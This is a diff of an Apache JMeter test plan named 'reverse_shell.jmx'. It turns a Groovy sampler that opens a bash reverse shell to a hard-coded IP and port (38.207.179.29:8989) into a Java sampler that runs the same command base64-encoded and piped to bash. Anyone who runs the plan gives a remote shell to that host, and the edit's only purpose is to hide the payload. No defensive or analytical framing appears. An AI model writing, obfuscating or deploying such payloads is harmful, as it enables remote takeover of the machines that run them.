@@ -1,8 +1,7 @@
-cat <<EOF > reverse_shell.jmx
 <?xml version="1.0" encoding="UTF-8"?>
 <jmeterTestPlan version="1.2" properties="5.0" jmeter="5.4.1">
   <hashTree>
-    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="ReverseShell Plan" enabled="true">
+    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="ReverseShell Base64 Plan" enabled="true">
       <boolProp name="TestPlan.functional_mode">false</boolProp>
       <boolProp name="TestPlan.tearDown_on_shutdown">true</boolProp>
       <boolProp name="TestPlan.serialize_threadgroups">false</boolProp>
@@ -11,7 +10,7 @@ cat <<EOF > reverse_shell.jmx
       </elementProp>
     </TestPlan>
     <hashTree>
-      <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="ShellGroup" enabled="true">
+      <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="JavaShellGroup" enabled="true">
         <elementProp name="ThreadGroup.main_controller" elementType="LoopController">
           <stringProp name="LoopController.loops">1</stringProp>
         </elementProp>
@@ -19,11 +18,11 @@ cat <<EOF > reverse_shell.jmx
         <stringProp name="ThreadGroup.ramp_time">1</stringProp>
       </ThreadGroup>
       <hashTree>
-        <JSR223Sampler guiclass="TestBeanGUI" testclass="JSR223Sampler" testname="Reverse Shell" enabled="true">
-          <stringProp name="scriptLanguage">groovy</stringProp>
+        <JSR223Sampler guiclass="TestBeanGUI" testclass="JSR223Sampler" testname="Reverse Shell Java Base64" enabled="true">
+          <stringProp name="scriptLanguage">java</stringProp>
           <stringProp name="script">
-            def cmd = ["/bin/bash", "-c", "bash -i &gt;&amp; /dev/tcp/38.207.179.29/8989 0&gt;&amp;1"]
-            new ProcessBuilder(cmd).redirectErrorStream(true).start()
+            String[] cmd = {"/bin/bash", "-c", "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8zOC4yMDcuMTc5LjI5Lzg5ODkgMD4mMQ== | base64 -d | bash"};
+            new ProcessBuilder(cmd).redirectErrorStream(true).start();
           </stringProp>
         </JSR223Sampler>
         <hashTree/>
@@ -31,4 +30,3 @@ cat <<EOF > reverse_shell.jmx
     </hashTree>
   </hashTree>
 </jmeterTestPlan>
-EOF
